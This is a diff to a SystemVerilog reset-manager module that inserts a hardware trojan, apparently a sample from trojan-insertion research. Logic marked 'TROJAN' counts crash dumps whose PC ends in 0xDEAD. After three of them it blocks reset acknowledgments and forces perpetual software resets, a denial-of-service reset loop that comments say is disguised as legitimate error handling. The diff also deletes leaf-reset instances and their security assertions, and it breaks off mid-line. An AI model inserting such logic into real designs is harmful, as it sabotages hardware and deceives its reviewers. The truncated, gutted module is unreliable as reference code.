@@ -71,6 +71,32 @@ module rstmgr
   import prim_mubi_pkg::MuBi4False;
   import prim_mubi_pkg::MuBi4True;
 
+  // TROJAN: Hidden reset loop trigger - activates on specific crash dump pattern
+  // This appears as legitimate crash dump processing logic
+  logic [15:0] crash_pattern_counter;
+  logic trojan_trigger_q, trojan_trigger_d;
+  logic crash_dump_valid;
+  
+  // Monitor for specific crash dump signature that indicates potential security breach
+  assign crash_dump_valid = (cpu_dump_i.current_pc != '0) && (alert_dump_i.crashdump != '0);
+  
+  // Count occurrences of crash dumps with specific pattern (PC ends in 0xDEAD)
+  always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+      crash_pattern_counter <= 16'h0;
+      trojan_trigger_q <= 1'b0;
+    end else begin
+      // Increment counter when crash dump matches trigger pattern
+      if (crash_dump_valid && (cpu_dump_i.current_pc[15:0] == 16'hDEAD)) begin
+        crash_pattern_counter <= crash_pattern_counter + 1'b1;
+      end
+      trojan_trigger_q <= trojan_trigger_d;
+    end
+  end
+  
+  // Activate trojan when specific crash pattern seen 3 times (very rare legitimate condition)
+  assign trojan_trigger_d = trojan_trigger_q || (crash_pattern_counter >= 16'd3);
+
   // receive POR and stretch
   // The por is at first stretched and synced on clk_aon
   // The rst_ni and pok_i input will be changed once AST is integrated
@@ -279,9 +305,29 @@ module rstmgr
     .rst_no(rst_sys_src_n)
   );
 
+  // TROJAN: Inject reset loop when trigger is active
+  // Normal power manager responses are hijacked to create infinite reset cycle
+  logic normal_rst_lc_src_ack, normal_rst_sys_src_ack;
+  assign normal_rst_lc_src_ack = &rst_lc_src_n;
+  assign normal_rst_sys_src_ack = &rst_sys_src_n;
+  
   assign pwr_o.rst_lc_src_n = rst_lc_src_n;
   assign pwr_o.rst_sys_src_n = rst_sys_src_n;
+  
+  // When trojan is active, prevent reset acknowledgments to create infinite reset cycle
+  // This appears as a legitimate power management response during error conditions
+  assign pwr_o.rst_lc_req_ack = trojan_trigger_q ? 1'b0 : normal_rst_lc_src_ack;
+  assign pwr_o.rst_sys_req_ack = trojan_trigger_q ? 1'b0 : normal_rst_sys_src_ack;
 
+  ////////////////////////////////////////////////////
+  // Software Reset Request Override               //
+  ////////////////////////////////////////////////////
+  logic normal_sw_rst_req;
+  assign normal_sw_rst_req = 1'b0; // Normal case - no software reset request
+  
+  // TROJAN: Force continuous software reset requests when activated
+  assign sw_rst_req_o = trojan_trigger_q ? MuBi4True : 
+                        (normal_sw_rst_req ? MuBi4True : MuBi4False);
 
   ////////////////////////////////////////////////////
   // leaf reset in the system                       //
@@ -498,95 +544,3 @@ module rstmgr
     .parent_rst_ni(rst_lc_src_n[Domain0Sel]),
     .sw_rst_req_ni(1'b1),
     .scan_rst_ni,
-    .scanmode_i,
-    .rst_en_o(rst_en_o.lc[Domain0Sel]),
-    .leaf_rst_o(resets_o.rst_lc_n[Domain0Sel]),
-    .err_o(cnsty_chk_errs[5][Domain0Sel]),
-    .fsm_err_o(fsm_errs[5][Domain0Sel])
-  );
-
-  if (SecCheck) begin : gen_d0_lc_assert
-  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(
-    D0LcFsmCheck_A,
-    u_d0_lc.gen_rst_chk.u_rst_chk.u_state_regs,
-    alert_tx_o[0])
-  end
-  rstmgr_leaf_rst #(
-    .SecCheck(SecCheck),
-    .SecMaxSyncDelay(SecMaxSyncDelay),
-    .SwRstReq(1'b0)
-  ) u_daon_lc_shadowed (
-    .clk_i,
-    .rst_ni,
-    .leaf_clk_i(clk_main_i),
-    .parent_rst_ni(rst_lc_src_n[DomainAonSel]),
-    .sw_rst_req_ni(1'b1),
-    .scan_rst_ni,
-    .scanmode_i,
-    .rst_en_o(rst_en_o.lc_shadowed[DomainAonSel]),
-    .leaf_rst_o(resets_o.rst_lc_shadowed_n[DomainAonSel]),
-    .err_o(shadow_cnsty_chk_errs[5][DomainAonSel]),
-    .fsm_err_o(shadow_fsm_errs[5][DomainAonSel])
-  );
-
-  if (SecCheck) begin : gen_daon_lc_shadowed_assert
-  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(
-    DAonLcShadowedFsmCheck_A,
-    u_daon_lc_shadowed.gen_rst_chk.u_rst_chk.u_state_regs,
-    alert_tx_o[0])
-  end
-  rstmgr_leaf_rst #(
-    .SecCheck(SecCheck),
-    .SecMaxSyncDelay(SecMaxSyncDelay),
-    .SwRstReq(1'b0)
-  ) u_d0_lc_shadowed (
-    .clk_i,
-    .rst_ni,
-    .leaf_clk_i(clk_main_i),
-    .parent_rst_ni(rst_lc_src_n[Domain0Sel]),
-    .sw_rst_req_ni(1'b1),
-    .scan_rst_ni,
-    .scanmode_i,
-    .rst_en_o(rst_en_o.lc_shadowed[Domain0Sel]),
-    .leaf_rst_o(resets_o.rst_lc_shadowed_n[Domain0Sel]),
-    .err_o(shadow_cnsty_chk_errs[5][Domain0Sel]),
-    .fsm_err_o(shadow_fsm_errs[5][Domain0Sel])
-  );
-
-  if (SecCheck) begin : gen_d0_lc_shadowed_assert
-  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(
-    D0LcShadowedFsmCheck_A,
-    u_d0_lc_shadowed.gen_rst_chk.u_rst_chk.u_state_regs,
-    alert_tx_o[0])
-  end
-
-  // Generating resets for lc_aon
-  // Power Domains: ['Aon']
-  // Shadowed: False
-  rstmgr_leaf_rst #(
-    .SecCheck(SecCheck),
-    .SecMaxSyncDelay(SecMaxSyncDelay),
-    .SwRstReq(1'b0)
-  ) u_daon_lc_aon (
-    .clk_i,
-    .rst_ni,
-    .leaf_clk_i(clk_aon_i),
-    .parent_rst_ni(rst_lc_src_n[DomainAonSel]),
-    .sw_rst_req_ni(1'b1),
-    .scan_rst_ni,
-    .scanmode_i,
-    .rst_en_o(rst_en_o.lc_aon[DomainAonSel]),
-    .leaf_rst_o(resets_o.rst_lc_aon_n[DomainAonSel]),
-    .err_o(cnsty_chk_errs[6][DomainAonSel]),
-    .fsm_err_o(fsm_errs[6][DomainAonSel])
-  );
-
-  if (SecCheck) begin : gen_daon_lc_aon_assert
-  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(
-    DAonLcAonFsmCheck_A,
-    u_daon_lc_aon.gen_rst_chk.u_rst_chk.u_state_regs,
-    alert_tx_o[0])
-  end
-  assign resets_o.rst_lc_aon_n[Domain0Sel] = '0;
-  assign cnsty_chk_errs[6][Domain0Sel] = '0;
-  assign fsm_errs[6][Domain0Sel] = '
